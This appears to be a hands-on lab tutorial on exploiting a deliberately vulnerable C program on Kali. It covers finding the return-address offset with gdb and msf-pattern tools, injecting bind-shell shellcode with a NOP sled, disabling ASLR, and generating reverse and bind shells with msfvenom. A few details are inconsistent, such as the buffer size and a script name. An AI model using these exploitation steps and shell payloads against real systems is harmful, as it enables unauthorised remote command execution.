### Preparation

All of the following exercises are meant to be done via `Kali`.
Start the Kali VM in `Oracle VM VirtualBoxâ„¢`. Before we start with the actual exercises we still need to install some tools:

- GNU C Compiler `gcc`
- GNU Debugger `gdb`
- Python `python3`

```shell
sudo apt-get update
sudo apt install gcc gdb python3 -y
```

The other tools that we need are all included in kali linux.

### Exercise 1: Compiling a C program without stack protection

```c
#include<stdio.h>
#include<string.h>

char* gets(char* buffer);  // Declare gets() manually

void vulnerable_function() {
    char buffer[10];    // Fixed-size buffer

    printf("Enter some text: ");
    gets(buffer);  // Unsafe: no bounds checking
    printf("You entered: %s\n", buffer);
}

int main() {
    vulnerable_function();
    return 0;
}

```

Our vulnerable C code as found in [vuln.c](vuln.c).
To test what this code does we need to compile it first:

```shell
gcc -g vuln.c -o vuln -fno-stack-protector -z execstack
```


The warning generated by GCC can be ignored.

When executing the program we can try entering more than 10 characters.

```shell
$ ./vuln
Enter some text: 1234567890abdc
You entered: 1234567890abdc
```

Even though the buffer is defined with size 8, because we are using `gets()`, we are able to enter more characters and cause the buffer to overflow. To examine what exactly is happening we are going to use `gdb`.

```shell
gdb ./vuln
```

### Exercise 2: Debugging our program with GDB

**Note that all adresses in this guide are might not be the same on your system.**

Depending on the version of GDB this might pop up when running `gdb` or using `run` in the GDB console. We can just ignore this with `n`.

```gdb
This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Enable debuginfod for this session? (y or [n])
```

Once we enter the GDB console we can use `break <function_name>` to set a breakpoint at a function. Then we can use `run` to start executing the program.

```gdb
break vulnerable_function
run
```

GDB gives us access to some powerful tools for debugging our program. For instance we can use `info registers` to print a list of the contents of all cpu registers. This might look something like this:

```gdb
(gdb) info registers
rax            0x0                 0
rbx            0x7fffffffdd18      140737488346392
rcx            0x555555557db8      93824992247224
rdx            0x7fffffffdd28      140737488346408
rsi            0x7fffffffdd18      140737488346392
rdi            0x1                 1
rbp            0x7fffffffdbe0      0x7fffffffdbe0
rsp            0x7fffffffdbd0      0x7fffffffdbd0
r8             0x0                 0
r9             0x7ffff7fca380      140737353917312
r10            0x7fffffffd910      140737488345360
r11            0x203               515
r12            0x1                 1
r13            0x0                 0
r14            0x555555557db8      93824992247224
r15            0x7ffff7ffd000      140737354125312
rip            0x555555555175      0x555555555175 <vulnerable_function+12>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
fs_base        0x7ffff7da1740      140737351653184
gs_base        0x0                 0
```

The two most important registers for us are `rsp` (stack pointer) and `rip` (instruction pointer).  

```gdb
(gdb) info registers rsp rip
rsp            0x7fffffffdbd0      0x7fffffffdbd0
rip            0x555555555175      0x555555555175 <vulnerable_function+12>
```

`rsp` points to the top of the stack (last element) and `rip` points to the next cpu instruction.
Since we set a break point at `vulnerable_function` the execution breaks when `rip` contains `<vulnerable_function+12>`.

Why `<vulnerable_function+12>` instead of `<vulnerable_function>`?
In x86_64 there are always some prelude instructions before the actual function code is executed.
This includes pushing both `rip` and `rbp` of the current context onto the stack.


```asm
push rbp            ; Save the old base pointer
mov rbp, rsp        ; Set the base pointer to the current stack pointer
sub rsp, N          ; Allocate space on the stack for local variables
```

We can check the assembly code of our program by using `disas vulnerable_function`. But we can't really see anything like `push rip` in here, so whats going on?
When we `disas main` to check, we can see that `call 0x555555555169` invokes our vulnerable function. 
The x86_64 `call <address>` command is essentially just a combination of `push rip` and `mov <adress> rip`.


The `print` command can be used to print the address of a pointer.

```gdb
(gdb) print &buffer
$1 = (char (*)[8]) 0x7fffffffdbd8
(gdb) print &vulnerable_function + 12
$2 = (void (*)()) 0x555555555175 <vulnerable_function+12
```

---

Additionally we can use `info frame` to see information about the current stack frame.

```gdb
(gdb) info frame
Stack level 0, frame at 0x7fffffffdbf0:
 rip = 0x555555555175 in vulnerable_function (vuln.c:11); saved rip = 0x5555555551c5
 called by frame at 0x7fffffffdc00
 source language c.
 Arglist at 0x7fffffffdbe0, args:
 Locals at 0x7fffffffdbe0, Previous frame's sp is 0x7fffffffdbf0
 Saved registers:
  rbp at 0x7fffffffdbe0, rip at 0x7fffffffdbe8
```

As mentioned earlier here are `rbp` and `rip` that got pushed onto the stack.
```gdb
 Saved registers:
  rbp at 0x7fffffffdbe0, rip at 0x7fffffffdbe8
```

Our stack looks like this:

```shell
rsp         |   0x7fffffffdbd0
&buffer     |   0x7fffffffdbd8
saved rbp   |   0x7fffffffdbe0
saved rip   |   0x7fffffffdbe8

# on x86 system the stack grows with descending addresses.
```
As we can see the offset between `&buffer` and `saved rip` is 16 bytes.
We can actually see this ourself in GDB.

```shell
(gdb) x/16x $rsp
0x7fffffffdbd0: 0x00000000      0x00000000      0xf7fe5af0      0x00007fff
0x7fffffffdbe0: 0xffffdb90      0x00007fff      0x555551c5      0x00005555
0x7fffffffdbf0: 0xffffdc30      0x00007fff      0xf7dce1ca      0x00007fff
0x7fffffffdb10: 0xffffdbe0      0x00007fff      0xffffdcb8      0x00007fff

# x/nx <address> -- prints n words (64 bit per word since we are on x86_64)
```

To make what we are looking at a bit more obvious we use `next` until we get prompted to enter text. Then we will just type 8 "A" to fill our buffer.

```shell
(gdb) x/16x $rsp
0x7fffffffdbd0: 0x00000000      0x00000000      0x41414141      0x41414141
0x7fffffffdbe0: 0xffffdb90      0x00007fff      0x555551c5      0x00005555
0x7fffffffdbf0: 0xffffdc30      0x00007fff      0xf7dce1ca      0x00007fff
0x7fffffffdc00: 0xffffdbe0      0x00007fff      0xffffdcb8      0x00007fff

# hint: "A" in hex is 41.
```

#### Exercise 3: Another way to find the offset.

An alternative method off finding this offset is using some builtin kali commands.
For this its helpful to open another terminal so we don't have to close gdb.

```shell
msf-pattern_create -l 40 > pattern.txt
cat pattern.txt 
```

The pattern displayed will help us automatically find the offset later.
Now we go back to out gdb and run:

```shell
(gdb) run < pattern.txt		# we run from the beginning again
(gdb) c				# continue program
```
Now the program crashes because of a segfault (invalid or disallowed memory access).
This happens because this overwrites the `rip` and `rbp` saved on the stack with nonsense.
We can use `info frame` to see what we wrote into a address of the saved `rip` on the stack.

```gdb
(gdb) info frame
Stack level 0, frame at 0x7fffffffdbf0:
 rip = 0x5555555551b2 in vulnerable_function (vuln.c:14);
    saved rip = 0x3761413661413561
 called by frame at 0x7fffffffdbf8
 source language c.
 Arglist at 0x4134614133614132, args:
 Locals at 0x4134614133614132, Previous frame's sp is 0x7fffffffdbf0
 Saved registers:
  rbp at 0x7fffffffdbe0, rip at 0x7fffffffdbe8
```

The important part here is the `saved rip = 0x3761413661413561`.
We can use this nonsense "address" to calculate the offset of our buffer to `rip` with the command below.

```shell
msf-pattern_offset -l 40 -q <saved rip>
```

In our case the offset should still be 16.

### Exercise 4: Crafting a more or less malicious payload

We are going to use [payload.py](payload.py) to construct a payload to feed to our vulnerable program.
Open `payload.py` with `nano`, `vim` or any text editor of your choice.

At the top of the script there `offset`, `rip` and `shellcode` we need to configure to generate a payload for a vulnerable program.
As we found out earlier our `offset` is 16 so we don't need to change it.
`rip` is simply the address of the `saved rip` on the stack. We can once again use `info frame` in gdb to find this.
For now the shellcode is a simple bind shell.

Once you modified the file, save it and run it via `python3 payload.bin`.
Now look at the binary with `xxd payload.bin` and compare it with the script to find the part of the binary where our malicious code starts.

### Exercise 5: Running the exploit.

Now we can go back to GDB and `run < payload.bin` to pipe in the payload.

If there is no error thats great! But most likely there will be a segfault.
To fix this we need to disable Address Space Layout Randomization.

```shell
cat /proc/sys/kernel/randomize_va_space

# 0: ASLR is disabled.
# 1: ASLR is enabled for the stack, 	mmap, VDSO, and shared libraries.
# 2: ASLR is fully enabled, including heap and memory segments.

sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"

# disables ASLR for current session.
```

After disabling ASLR trying running the program again. If there is still an error check if the address of `saved rip` is still up to date (disabling ASLR might cause an update).

If there are no more errors open another terminal and verify if our exploit is working.

```shell
nc localhost 4444
```

Running this command will connect us to the bind shell run from `./vuln`. We can now execute any commands we want in here.
Now that our buffer overflow attack is working we can `quit` the gdb session and run it with `./vuln < payload.bin`. 

```shell
$ ./vuln < payload.bin
Enter some text: You entered: AAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

As since the stack grows in descending address order, programs that are higher in the call stack should have a higher address in memory.
To verify we are going to look at `saved rip` both in GDB and just the plain terminal.
In my case in GDB `saved rip` is at `0x7fffffffdb88`.


But how do we find out `saved rip` without running `./vuln` in GDB?
Turns out we can enable something called coredumps. This is basically a file containing the state of the program that gets written whenever our program crashes.
Gdb supports debugging from a dump file which is how we will look at the `saved rip`


```shell
ulimit -c unlimited
echo "/tmp/core.%e.%p" | sudo tee /proc/sys/kernel/core_pattern
```

This enables coredumps and create a directory for them to be written into.
After running our program again and causing a crash.

```shell
$ ls /tmp/core.vuln.*
/tmp/core.vuln.3143
```

Now we can open GDB with the coredump attached.

```shell
gdb ./vuln /tmp/core.vuln.3143
```

In my case the `saved rip` is `0x7fffffffdc60`. Since im pretty sure there is not really a higher level in the call stack than the terminal we can work with we can go modify our `payload.py` once more.
After running the update we can check if the program runs in the terminal

```shell
$ ./vuln < payload.bin
Enter some text: You entered: AAAAAAAAAAAAAAAAh

```

Great, now it seems to work. Lets just try it in GDB real to make sure.
Huh, another segfault. Lets look at the memory to see what going on.

```shell
(gdb) x/16x $rsp
0x7fffffffdbd0: 0x00000000      0x00000000      0x41414141      0x41414141
0x7fffffffdbe0: 0x41414141      0x41414141      0xffffdc68      0x00007fff
0x7fffffffdbf0: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffdc00: 0xdb31c031      0x01b0d231      0xc0fec689      0x06b2c789
```

At `saved rip` `0x7fffffffdbe8` we can see that we correct wrote `0x7fffffffdc60 + 8` as the next instruction. Sadly in this context that address is way above our injected code.
How do we fix this? As we can also see there are a bunch of `\x90`s in here which is the NOP (No Operation) instruction. NOP instructions do nothing besides incrementing `rip`.
If we once again look at `payload.py` we can also see `sledsize` as a constant. The idea is to simply slide into our actual code with a bunch of NOPs.
We simply set this to something high like 2048 and remake our `payload.bin`.
If we now run this with GDB again everything should work.


#### Exercise 5 (Optional): Experimenting with other payloads.

As said earlier the payload we have been using a bind shell as our payload.
The specific hex code comes from [https://shell-storm.org/shellcode/index.html](shell-storm.org)



We can open the metasploit framework `msfconsole` to find some other payloads.
With `search platform:linux arch:x64` we can find all payloads available for 64bit linux.
You can pick whatever payload you want, but i suggest using one of these.

```shell
linux/x64/shell_bind_tcp
linux/x64/meterpreter/bind_tcp
linux/x64/shell_reverse_tcp
linux/x64/meterpreter/reverse_tcp
```

We can use `info <module-name>` to get more information. I im going to be using `linux/x64/shell_reverse_tcp`, so if you are using something else just google how to interact with it.

```shell
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f c

# -f	-- format flag, allows a lot of languages as option
```

Now you can take the output of `msfvenom` and use it to make a new `test.c`.

```c
int main() {
    char buf[] = "";          // replace with payload
    (*(void (*)()) buf)();
}
```

```shell
gcc -g test.c -o test -fno-stack-protector -z execstack
```
We do this to see if the shellcode is even working. In the case of `linux/x64/shell_reverse_tcp` we can use `nc -lvp 4444`, this create a tcp listener on port 4444.
If the payload you choose needs something else, then do that.

We can `./test` and our listener should receive a connection. Now we simply use `msfvenom` with `-f py` and it generate a payload we can modify `payload.py` with.
After regenerating `payload.bin` and restarting `nc -lvp 4444` we can now `./vuln < payload.bin` and have it connect.




